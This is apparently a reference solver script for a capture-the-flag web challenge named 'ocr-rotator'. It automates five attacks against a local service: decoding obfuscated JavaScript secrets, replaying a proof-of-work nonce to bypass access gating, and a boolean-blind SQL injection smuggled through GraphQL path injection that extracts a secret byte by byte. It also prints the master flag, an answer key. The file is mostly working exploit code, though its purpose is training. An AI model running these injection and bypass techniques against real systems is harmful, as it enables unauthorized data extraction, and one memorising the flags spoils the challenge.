#!/usr/bin/env python3
"""Reference solver for ocr-rotator — collects all five flags.

Pipeline:
  1. Read /js/app.js, decode the obfuscated _bld and _tk constants.
       → HMAC flag         = "Cybersci{hmac-" + HMAC-SHA256(_tk, _bld)[:16] + "}"
  2. POST GraphQL `{ flag }` against /api/quotes.
       → GraphQL flag       (constant string returned by the resolver)
  3. List /images/, solve one PoW, submit it for img-A.
  4. Fetch a *different* image (img-B) with the nonce registered for img-A.
     The retrieval check only verifies the nonce exists, not its binding
     — so the request succeeds, but the proxy notices the mismatch and
     emits an `X-Audit-Token` response header carrying the flag.
       → PoW-replay flag    (read from the response header, not the body)
  5. Download all 5000 cards in parallel with the same nonce (same trick).
       → Image-metadata flag = `Flag` PNG tEXt chunk (same on every card)
  6. Find the chosen card via `Solution: true` metadata, OCR its phrase,
     compute folder_id = HMAC-SHA256(phrase, _bld)[:16].
  7. Boolean-blind SQLi via GraphQL path injection on
     `GET /api/quotes/<path>` — closes the implicit `quote(id: ...)` and
     chains `findQuote(filter: "<sqli>")`. Watches `"findQuote":{` vs
     `"findQuote":null` to extract the flag byte by byte.
       → Master flag         = `Cybersci{vXukCggDCyberScigQKscRDR}`

Requirements:
  pip install pillow pytesseract requests
  apt-get install tesseract-ocr   (or: brew install tesseract)

Usage:
  python3 tools/solve.py
  python3 tools/solve.py --base http://localhost:8080
"""

import argparse
import base64
import hashlib
import hmac
import io
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    sys.exit("missing dependency: pip install requests")

try:
    from PIL import Image
except ImportError:
    sys.exit("missing dependency: pip install pillow")

try:
    import pytesseract
except ImportError:
    sys.exit("missing dependency: pip install pytesseract (and apt-get install tesseract-ocr)")


# ---- listing / download ----------------------------------------------------


def list_images(base_url: str):
    r = requests.get(base_url.rstrip('/') + '/images/', timeout=10)
    r.raise_for_status()
    return sorted(set(re.findall(r'href="(img-\d{5}\.png)"', r.text)))


# ---- JS constant reconstruction --------------------------------------------


def _reconstruct_js_constant(name: str, js: str) -> str:
    """Find `const <name> = (function () { const _? = [<pieces>]; ... })();`
    and reconstruct the value from the String.fromCharCode/atob fragments."""
    m = re.search(
        r"const " + re.escape(name) + r"\s*=\s*\(function\s*\(\)\s*\{\s*const \w+\s*=\s*\[(.*?)\]",
        js, re.DOTALL,
    )
    if not m:
        raise RuntimeError(f"couldn't find constant {name!r} in app.js")
    block = m.group(1)
    pieces = []
    for piece in re.finditer(
        r"String\.fromCharCode\(([^)]+)\)|atob\(\s*['\"]([^'\"]+)['\"]\s*\)", block,
    ):
        if piece.group(1):
            codes = [int(x.strip(), 0) for x in piece.group(1).split(',')]
            pieces.append(''.join(chr(c) for c in codes))
        else:
            pieces.append(base64.b64decode(piece.group(2)).decode())
    return '-'.join(pieces)


def fetch_js_constants(base_url: str):
    r = requests.get(base_url.rstrip('/') + '/js/app.js', timeout=10)
    r.raise_for_status()
    return _reconstruct_js_constant('_bld', r.text), _reconstruct_js_constant('_tk', r.text)


# ---- HMAC ------------------------------------------------------------------


def hmac_truncated(key: str, message: str, n: int = 16) -> str:
    return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()[:n]


def folder_id_for(phrase: str, key: str) -> str:
    return hmac_truncated(key, phrase)


# ---- PoW (replay-bypass setup) ---------------------------------------------


def _leading_zero_bits(digest: bytes, bits: int) -> bool:
    full_bytes, remainder = divmod(bits, 8)
    if any(digest[i] for i in range(full_bytes)):
        return False
    if remainder and (digest[full_bytes] >> (8 - remainder)):
        return False
    return True


def find_pow_nonce(challenge: str, filename: str, bits: int) -> str:
    i = 0
    target_prefix = (challenge + filename).encode()
    while True:
        nonce = format(i, 'x')
        digest = hashlib.sha256(target_prefix + nonce.encode()).digest()
        if _leading_zero_bits(digest, bits):
            return nonce
        i += 1


def acquire_pow_nonce(session, base_url: str, sample_image: str) -> str:
    """Solve PoW for one specific image, submit it, return the nonce.
    The proxy's retrieval check ignores the filename binding, so this
    nonce works for every gated path (every img-NNNNN.png AND flag.txt)."""
    base = base_url.rstrip('/')
    info = session.get(f"{base}/pow/challenge?image={sample_image}", timeout=10).json()
    nonce = find_pow_nonce(info['challenge'], sample_image, info['bits'])
    session.post(f"{base}/pow/submit",
                 json={"image": sample_image, "nonce": nonce},
                 timeout=10).raise_for_status()
    return nonce


def fetch(base_url: str, name: str, nonce: str):
    r = requests.get(f"{base_url.rstrip('/')}/images/{name}",
                     params={"pow": nonce}, timeout=10)
    r.raise_for_status()
    return name, r.content


# ---- per-flag helpers ------------------------------------------------------


def fetch_graphql_flag(base_url: str) -> str:
    """Flag exposed via the `flag` GraphQL field (visible on introspection)."""
    r = requests.post(base_url.rstrip('/') + '/api/quotes',
                      json={"query": "{ flag }"}, timeout=10)
    r.raise_for_status()
    return r.json()['data']['flag']


def fetch_pow_replay_flag(base_url: str, nonce: str, replay_target: str) -> str:
    """Trigger the replay detection: fetch `replay_target` with a nonce
    that was registered for a *different* image. The proxy still serves
    the image (the bug) but tags the response with `X-Audit-Token`
    carrying the flag. Reading just the body is a dead end — the flag
    only lives in the response header."""
    r = requests.get(f"{base_url.rstrip('/')}/images/{replay_target}",
                     params={"pow": nonce}, timeout=10)
    r.raise_for_status()
    flag = r.headers.get('X-Audit-Token')
    if not flag:
        raise RuntimeError(
            "no X-Audit-Token header on the replay response — "
            "did the request actually use a *different* filename than the nonce was registered for?"
        )
    return flag


def fetch_image_metadata_flag(blobs) -> str:
    """Flag stamped into every PNG's `Flag` tEXt chunk."""
    for _, data in blobs:
        try:
            img = Image.open(io.BytesIO(data))
            img.load()
            v = img.text.get('Flag')
            if v:
                return v
        except Exception:
            continue
    raise RuntimeError("no image carried a Flag metadata chunk")


def find_chosen(blobs):
    for name, data in blobs:
        try:
            img = Image.open(io.BytesIO(data))
            img.load()
            if img.text.get('Solution') == 'true':
                return name, data
        except Exception:
            continue
    return None, None


def ocr_phrase(data: bytes) -> str:
    img = Image.open(io.BytesIO(data)).convert('L')
    text = pytesseract.image_to_string(img, config='--psm 7 -l eng')
    text = text.lower()
    text = re.sub(r'[^a-z ]', ' ', text)
    return ' '.join(text.split())


# ---- master-flag SQLi (boolean blind via GraphQL path injection) -----------


# `"findQuote":{` is the TRUE marker; `"findQuote":null` is FALSE.
TRUE_MARKER = '"findQuote":{'


def _gql_string_escape(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


def build_path_payload(folder: str, char_pos: int, threshold: int) -> str:
    sqli = (
        f"1 AND ("
        f"SELECT unicode(substr(flag, {char_pos}, 1)) "
        f"FROM secrets WHERE ocr_value = '{folder}'"
        f") < {threshold} -- "
    )
    return '1) { id } findQuote(filter: "' + _gql_string_escape(sqli) + '"'


def query_truth(session, base_url: str, folder: str, char_pos: int, threshold: int) -> bool:
    payload = build_path_payload(folder, char_pos, threshold)
    url = base_url.rstrip('/') + '/api/quotes/' + urllib.parse.quote(payload, safe='')
    return TRUE_MARKER in session.get(url, timeout=10).text


def extract_master_flag(base_url: str, folder: str, max_len: int = 64) -> str:
    session = requests.Session()
    out = []
    for char_pos in range(1, max_len + 1):
        if not query_truth(session, base_url, folder, char_pos, 0x80):
            break
        lo, hi = 0x20, 0x80
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if query_truth(session, base_url, folder, char_pos, mid):
                hi = mid
            else:
                lo = mid
        out.append(chr(lo))
    return ''.join(out)


# ---- main ------------------------------------------------------------------


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base', default='http://localhost:8080',
                    help='base URL of the challenge HTTP service')
    ap.add_argument('--workers', type=int, default=64)
    args = ap.parse_args()

    base = args.base.rstrip('/')
    t0 = time.monotonic()
    flags: dict[str, str] = {}

    # --- Flag 1: HMAC, derivable purely from JS-source obfuscated constants
    print(f"[*] reading {base}/js/app.js for obfuscated constants…")
    key, token = fetch_js_constants(base)
    print(f"    _bld decoded:        {key!r}")
    print(f"    _tk  decoded:        {token!r}")
    flags['hmac'] = f"Cybersci{{hmac-{hmac_truncated(key, token)}}}"
    print(f"[+] flag (hmac):         {flags['hmac']}")

    # --- Flag 2: GraphQL `flag` field
    print(f"[*] querying GraphQL `{{ flag }}`…")
    flags['graphql'] = fetch_graphql_flag(base)
    print(f"[+] flag (graphql):      {flags['graphql']}")

    # --- Set up the PoW replay bypass (one solve, reuse for all gated paths)
    names = list_images(base)
    print(f"[*] listing /images/ → {len(names)} card filenames")
    if not names:
        sys.exit("no images returned — generator may not have completed its first cycle yet")

    print("[*] solving PoW once (will reuse the nonce for every gated request)…")
    sess = requests.Session()
    pow_t = time.monotonic()
    registered_for = names[0]
    nonce = acquire_pow_nonce(sess, base, registered_for)
    print(f"    nonce={nonce} (solved+submitted in {time.monotonic() - pow_t:.2f}s)")

    # --- Flag 3: PoW replay (proxy emits X-Audit-Token when a nonce is
    # used for a different filename than the one it was registered for).
    replay_target = next(n for n in names if n != registered_for)
    flags['pow_replay'] = fetch_pow_replay_flag(base, nonce, replay_target)
    print(f"[+] flag (pow-replay):   {flags['pow_replay']}")

    # --- Bulk download (also enables the next two flags)
    print(f"[*] downloading {len(names)} cards with {args.workers} workers (reused nonce)…")
    dl_t = time.monotonic()
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        blobs = list(pool.map(lambda n: fetch(base, n, nonce), names))
    print(f"    downloaded {len(blobs)} files in {time.monotonic() - dl_t:.1f}s")

    # --- Flag 4: image metadata (every card carries the same Flag tEXt chunk)
    flags['image_meta'] = fetch_image_metadata_flag(blobs)
    print(f"[+] flag (image-meta):   {flags['image_meta']}")

    # --- Flag 5: master — OCR + HMAC + boolean-blind SQLi
    print("[*] scanning metadata for the chosen card…")
    chosen_name, chosen_bytes = find_chosen(blobs)
    if not chosen_name:
        sys.exit("no image with Solution metadata — rotation may have just happened, retry")
    print(f"    chosen: {chosen_name}")

    print("[*] OCR'ing the chosen card…")
    phrase = ocr_phrase(chosen_bytes)
    if not phrase or not re.fullmatch(r'[a-z ]+', phrase):
        sys.exit(f"OCR returned something unexpected: {phrase!r}")
    print(f"    phrase: {phrase!r}")

    folder = folder_id_for(phrase, key)
    print(f"    folder identifier: {folder}")

    print("[*] extracting master flag via boolean-blind SQLi on /api/quotes/<path>…")
    flags['master'] = extract_master_flag(base, folder)
    print(f"[+] flag (master):       {flags['master']}")

    # --- Summary
    elapsed = time.monotonic() - t0
    print()
    print("=" * 60)
    print(f" ALL FLAGS COLLECTED  ({elapsed:.1f}s total)")
    print("=" * 60)
    for name, value in flags.items():
        print(f"  {name:11s}  {value}")


if __name__ == '__main__':
    main()
